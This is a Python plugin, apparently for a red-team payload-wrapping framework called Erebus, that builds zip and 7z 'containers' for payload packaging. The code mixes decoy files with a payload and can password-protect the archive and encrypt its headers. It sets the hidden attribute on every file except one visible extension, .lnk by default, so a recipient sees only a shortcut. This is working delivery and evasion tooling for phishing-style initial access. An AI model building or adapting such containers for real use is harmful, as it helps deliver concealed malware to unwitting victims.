"""
Example Erebus Plugin - Archive Container
Author: Whispergate
Description: Example plugin showing how to create archive containers (7z, zip)

This plugin demonstrates:
1. How to inherit from ErebusPlugin
2. How to define metadata
3. How to register functions
4. How to keep existing code while making it plugin-compatible
"""

import pathlib
import shutil
import zipfile
from typing import Dict, Callable

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class ArchiveContainerPlugin(ErebusPlugin):
    """
    Plugin for creating archive containers (7z and zip files).
    
    This plugin provides functionality to package payloads into password-protected
    or standard archive files with custom compression settings.
    """
    
    def __init__(self):
        """Initialize the archive container plugin"""
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.DEFAULT_ROOT = self.REPO_ROOT / "agent_code"
    
    def get_metadata(self) -> PluginMetadata:
        """Return plugin metadata"""
        return PluginMetadata(
            name="archive_container",
            version="1.0.0",
            author="Whispergate",
            description="Creates 7z and zip archive containers for payload packaging",
            category=PluginCategory.CONTAINER,
            enabled=True
        )
    
    def register(self) -> Dict[str, Callable]:
        """Register the functions this plugin provides"""
        return {
            "build_7z": self.build_7z,
            "build_zip": self.build_zip,
        }
    
    def validate(self) -> tuple[bool, str]:
        """Validate that required dependencies are available"""
        try:
            import py7zr
            return (True, None)
        except ImportError as e:
            return (False, f"Missing required dependency: {e}")
    
    def on_load(self):
        """Called when plugin is loaded"""
        print(f"[Plugin] Archive Container plugin loaded - Supporting 7z and zip formats")
    
    # ==================== Plugin Functions ====================
    
    def build_7z(
        self,
        compression: str = "9",
        password: str = None,
        build_path: pathlib.Path = None,
        visible_extension: str = ".lnk"
    ) -> pathlib.Path:
        """
        Create a 7z archive container.
        
        Args:
            compression: Compression level (0-9, 9 is highest)
            password: Optional password for archive encryption
            build_path: Path to the build directory (uses default if None)
            visible_extension: File extension that should remain visible in the archive
            
        Returns:
            pathlib.Path: Path to the created 7z archive
            
        Raises:
            RuntimeError: If archive creation fails
        """
        root_dir = build_path if build_path else self.DEFAULT_ROOT
        container_dir = root_dir / "container"
        payload_dir = root_dir / "payload"
        decoy_dir = root_dir / "decoys"

        try:
            import py7zr
            # Copy decoy files to payload directory
            for item in decoy_dir.rglob('*'):
                if item.is_file() and not item.name.startswith('.'):
                    tgt = payload_dir / item.relative_to(decoy_dir)
                    tgt.parent.mkdir(parents=True, exist_ok=True)
                    shutil.copy2(item, tgt)

            # Create archive
            archive_name = "erebus.7z"
            archive_path = container_dir / "7z" / archive_name
            archive_path.parent.mkdir(parents=True, exist_ok=True)

            filters = [{'id': py7zr.FILTER_LZMA2, 'preset': int(compression)}]

            with py7zr.SevenZipFile(
                archive_path, 
                'w', 
                filters=filters, 
                password=password,
                header_encryption=True if password else False
            ) as archive:
                # Add all files from payload directory
                for item in payload_dir.rglob('*'):
                    if item.is_file() and not item.name.startswith('.'):
                        arcname = item.relative_to(payload_dir)
                        archive.write(item, arcname)

                # Set file attributes (hide non-visible extensions)
                for f in archive.files:
                    if hasattr(f, 'filename'):
                        p = pathlib.Path(f.filename)
                        attr = 0x20  # Archive attribute
                        if p.suffix.lower() != visible_extension.lower():
                            attr |= 0x02  # Hidden attribute
                        
                        if hasattr(f, '_file_info') and isinstance(f._file_info, dict):
                            f._file_info['attributes'] = attr

            return archive_path

        except Exception as e:
            raise RuntimeError(f"7z creation failed: {e}")
    
    def build_zip(
        self,
        compression: int = 9,
        password: str = None,
        build_path: pathlib.Path = None,
        visible_extension: str = ".lnk"
    ) -> pathlib.Path:
        """
        Create a zip archive container.
        
        Args:
            compression: Compression level (0-9, 9 is highest)
            password: Optional password for archive encryption
            build_path: Path to the build directory (uses default if None)
            visible_extension: File extension that should remain visible in the archive
            
        Returns:
            pathlib.Path: Path to the created zip archive
            
        Raises:
            RuntimeError: If archive creation fails
        """
        root_dir = build_path if build_path else self.DEFAULT_ROOT
        container_dir = root_dir / "container"
        payload_dir = root_dir / "payload"
        decoy_dir = root_dir / "decoys"

        try:
            # Copy decoy files to payload directory
            for item in decoy_dir.rglob('*'):
                if item.is_file() and not item.name.startswith('.'):
                    tgt = payload_dir / item.relative_to(decoy_dir)
                    tgt.parent.mkdir(parents=True, exist_ok=True)
                    shutil.copy2(item, tgt)

            # Create zip archive
            container_dir.mkdir(parents=True, exist_ok=True)
            zip_path = container_dir / "zip" / "erebus.zip"
            zip_path.parent.mkdir(parents=True, exist_ok=True)

            compress_type = zipfile.ZIP_DEFLATED if int(compression) > 0 else zipfile.ZIP_STORED

            with zipfile.ZipFile(zip_path, 'w', compression=compress_type) as zf:
                if password:
                    zf.setpassword(password.encode())

                # Add all files from payload directory
                for item in payload_dir.rglob('*'):
                    if item.is_file() and not item.name.startswith('.'):
                        arcname = item.relative_to(payload_dir)
                        zinfo = zipfile.ZipInfo.from_file(item, arcname)
                        zinfo.create_system = 0  # Windows
                        
                        # Set file attributes (hide non-visible extensions)
                        attr = 0x20  # Archive attribute
                        if item.suffix.lower() != visible_extension.lower():
                            attr |= 0x02  # Hidden attribute

                        zinfo.external_attr = (attr & 0xFF)
                        
                        with open(item, "rb") as f:
                            zf.writestr(zinfo, f.read())

            return zip_path

        except Exception as e:
            raise RuntimeError(f"Zip creation failed: {e}")

if __name__ == "__main__":
    _plugin = ArchiveContainerPlugin()
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    
    # Display all registered functions
    registered = _plugin.register()
    registered_names = sorted(registered.keys()) if registered else []
    print(f"[*] Registered functions ({len(registered_names)}):")
    for func_name in registered_names:
        print(f"    - {func_name}")
    print()
    
    is_valid, error = _plugin.validate()
    if is_valid:
        print("[+] Validation passed")
    else:
        print(f"[-] Validation failed: {error}")
